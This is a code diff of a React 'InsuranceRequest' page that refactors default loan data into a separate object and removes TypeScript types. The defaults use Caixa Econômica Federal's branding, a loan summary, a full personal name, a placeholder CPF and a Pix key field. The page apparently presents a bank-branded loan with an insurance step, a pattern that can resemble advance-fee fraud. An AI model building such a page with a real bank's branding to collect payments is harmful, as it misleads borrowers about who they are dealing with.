@@ -38,6 +38,20 @@ const InsuranceRequest = () => {
     }
   }, []);
   
+  // Usa valores padrão caso não receba dados via state
+  const defaultState = {
+    bankLogo: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Caixa_Econ%C3%B4mica_Federal_logo.svg/2560px-Caixa_Econ%C3%B4mica_Federal_logo.svg.png",
+    bankName: "Caixa Econômica Federal",
+    totalAmount: 10000,
+    installmentsCount: 60,
+    installmentValue: 250,
+    interestRate: 0.018,
+    userName: "JUAREZ JOSE FERNANDES DE FREITAS",
+    userCPF: "123.456.789-00",
+    pixKey: ""
+  };
+
+  // Extraindo valores do state ou usando valores padrão
   const { 
     bankLogo, 
     bankName,
@@ -48,21 +62,12 @@ const InsuranceRequest = () => {
     userName,
     userCPF,
     pixKey
-  } = location.state || {
-    bankLogo: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8d/Caixa_Econ%C3%B4mica_Federal_logo.svg/2560px-Caixa_Econ%C3%B4mica_Federal_logo.svg.png",
-    bankName: "Caixa Econômica Federal",
-    totalAmount: 10000,
-    installmentsCount: 60,
-    installmentValue: 250,
-    interestRate: 0.018,
-    userName: "JUAREZ JOSE FERNANDES DE FREITAS",
-    userCPF: "123.456.789-00"
-  };
+  } = location.state || defaultState;
 
   const actualUserName = storedUserName || userName;
   const actualCPF = storedCPF || userCPF;
 
-  const formatCPF = (cpf: string) => {
+  const formatCPF = (cpf) => {
     if (!cpf) return '';
     if (cpf.includes('.') || cpf.includes('-')) return cpf;
     
@@ -72,7 +77,7 @@ const InsuranceRequest = () => {
     return `${cpfDigits.slice(0, 3)}.${cpfDigits.slice(3, 6)}.${cpfDigits.slice(6, 9)}-${cpfDigits.slice(9)}`;
   };
 
-  const formatCurrency = (value: number): string => {
+  const formatCurrency = (value) => {
     return new Intl.NumberFormat('pt-BR', {
       style: 'currency',
       currency: 'BRL',
